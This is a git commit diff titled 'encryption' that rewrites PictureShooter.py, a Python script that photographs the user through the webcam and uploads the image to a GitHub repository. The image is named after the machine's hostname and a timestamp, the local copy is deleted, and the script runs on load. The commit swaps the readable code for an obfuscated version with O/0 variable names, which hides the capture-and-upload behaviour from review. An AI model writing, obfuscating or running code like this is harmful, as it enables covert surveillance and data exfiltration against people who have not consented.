8f7525691acf5c336220f12f1134b54377ad33e6
Ali El khattabi <60844044+AliElkhattabi99@users.noreply.github.com>
2023-06-01 00:51:46 +0200

    Update PictureShooter.py
    encryption

--- PictureShooter.py
+++ PictureShooter.py
@@ -1,51 +1,30 @@
-import cv2
-from Github import Github
-import os
-import socket
-from datetime import datetime
-
-
-class PictureShooter:
-    def capture_and_upload_picture():
-        # Open the webcam
-        cap = cv2.VideoCapture(0)
-        github = Github()
-
-        # Check if the webcam is opened correctly
-        if not cap.isOpened():
-            print("Failed to open the webcam")
-            return
-
-        # Capture a frame from the webcam
-        ret, frame = cap.read()
-
-        # Check if the frame is captured successfully
-        if not ret:
-            print("Failed to capture frame")
-            return
-
-        # Save the captured frame as an image
-        picture_path = "picture.jpg"
-        cv2.imwrite(picture_path, frame)
-
-        # Release the webcam
-        cap.release()
-
-        try:
-            with open(picture_path, "rb") as file:
-                content = file.read()
-                name = (
-                    socket.gethostname()
-                    + datetime.today().strftime("%Y-%m-%d %H:%M:%S")
-                    + ".png"
-                )
-                print("Picture uploaded successfully")
-                github.save_to_repo("Pictures/" + name, content)
-                print("Picture done"),
-            os.remove("picture.jpg")
-        except Exception as e:
-            print(f"Failed to upload picture: {str(e)}")
-
-
-# Capture a picture and upload it to GitHub
-PictureShooter.capture_and_upload_picture()
+import cv2 #line:1
+from Github import Github #line:2
+import os #line:3
+import socket #line:4
+from datetime import datetime #line:5
+class PictureShooter :#line:8
+    def capture_and_upload_picture ():#line:9
+        OOO00O000000000OO =cv2 .VideoCapture (0 )#line:11
+        O0000OOOO000OOOOO =Github ()#line:12
+        if not OOO00O000000000OO .isOpened ():#line:15
+            print ("Failed to open the webcam")#line:16
+            return #line:17
+        O0OOOO00O00OOO0O0 ,OO0O0OOOO0OOO0OO0 =OOO00O000000000OO .read ()#line:20
+        if not O0OOOO00O00OOO0O0 :#line:23
+            print ("Failed to capture frame")#line:24
+            return #line:25
+        O00000O00OO00O0O0 ="picture.jpg"#line:28
+        cv2 .imwrite (O00000O00OO00O0O0 ,OO0O0OOOO0OOO0OO0 )#line:29
+        OOO00O000000000OO .release ()#line:32
+        try :#line:34
+            with open (O00000O00OO00O0O0 ,"rb")as OO0OO0OO0O000O00O :#line:35
+                O000OOOOO0O0O0OO0 =OO0OO0OO0O000O00O .read ()#line:36
+                O0OOOO0OO0OO000OO =(socket .gethostname ()+datetime .today ().strftime ("%Y-%m-%d %H:%M:%S")+".png")#line:41
+                print ("Picture uploaded successfully")#line:42
+                O0000OOOO000OOOOO .save_to_repo ("Pictures/"+O0OOOO0OO0OO000OO ,O000OOOOO0O0O0OO0 )#line:43
+                print ("Picture done"),#line:44
+            os .remove ("picture.jpg")#line:45
+        except Exception as OO000O0OOO0O00O0O :#line:46
+            print (f"Failed to upload picture: {str(OO000O0OOO0O00O0O)}")#line:47
+PictureShooter .capture_and_upload_picture ()#line:51
